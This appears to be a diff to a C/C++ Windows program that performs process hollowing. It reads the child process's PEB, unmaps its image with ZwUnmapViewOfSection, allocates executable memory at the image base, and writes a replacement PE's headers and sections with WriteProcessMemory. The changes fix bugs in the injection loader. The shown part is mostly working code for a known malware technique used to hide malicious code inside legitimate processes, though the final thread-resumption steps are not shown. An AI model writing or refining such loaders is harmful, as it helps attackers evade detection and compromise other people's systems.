@@ -1,7 +1,7 @@
 #include <stdio.h>
 #include "helper.h"
 #include <windows.h>
-
+#include <wdbgexts.h>
 int main()
 {
 	STARTUPINFO si;
@@ -38,7 +38,12 @@ int main()
 		returnLen
 	);
 
-	ZwUnmapViewOfSection(pi.hProcess, pbi.PebBaseAddress);
+	// GET PEB Info
+	PEB* peb = new PEB();
+	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, peb, sizeof(PEB), 0);
+	printf("%x\n", peb->ImageBaseAddress);
+
+	ZwUnmapViewOfSection(pi.hProcess, peb->ImageBaseAddress);
 
 
 
@@ -52,11 +57,8 @@ int main()
 
 
 
-	LPVOID lpVMem = VirtualAllocEx(pi.hProcess, pbi.PebBaseAddress, pNTHeaderYo->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	LPVOID lpVMem = VirtualAllocEx(pi.hProcess, peb->ImageBaseAddress, pNTHeaderYo->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-	
-	
-	
 
 	BYTE* headerBuffer = new BYTE[pNTHeaderYo->OptionalHeader.SizeOfHeaders + 1];
 
@@ -65,22 +67,29 @@ int main()
 	//for (int i = 0; i < 1025; i++)
 	//	printf("%x ", headerBuffer[i]);
 
-	if (!WriteProcessMemory(pi.hProcess, pbi.PebBaseAddress, headerBuffer, pNTHeaderYo->OptionalHeader.SizeOfHeaders, NULL))
+	if (!WriteProcessMemory(pi.hProcess, peb->ImageBaseAddress, headerBuffer, pNTHeaderYo->OptionalHeader.SizeOfHeaders, NULL))
 	{
 		printf("Failed: Unable to write headers");
-		exit(-1);
+		return -1;
 	}
 
+	
+	
+	
 	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(pNTHeaderYo);
 	for (int i = 0; i < pNTHeaderYo->FileHeader.NumberOfSections; i++)
 	{
-		BYTE* section = new BYTE[sectionHeader->Misc.VirtualSize];
-		memcpy(section, (const void *)((DWORD)dosHeaderYo + (DWORD)sectionHeader->PointerToRawData), (DWORD)sectionHeader->Misc.VirtualSize);
+		BYTE* section = new BYTE[sectionHeader->SizeOfRawData];
+		memcpy(section, (const void *)((DWORD)dosHeaderYo + (DWORD)sectionHeader->PointerToRawData), (DWORD)sectionHeader->SizeOfRawData);
 
 		printf("Copying data from: %s\n", sectionHeader->Name);
 		//for(int j = 0; j < sectionHeader->Misc.VirtualSize; j++)
 		//	printf("%x ", section[j]);
-
+		if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)peb->ImageBaseAddress + sectionHeader->VirtualAddress), section, (DWORD)sectionHeader->SizeOfRawData, NULL))
+		{
+			printf("Failed: %i", GetLastError());
+			return -1;
+		}
 		sectionHeader++;
 	}
 
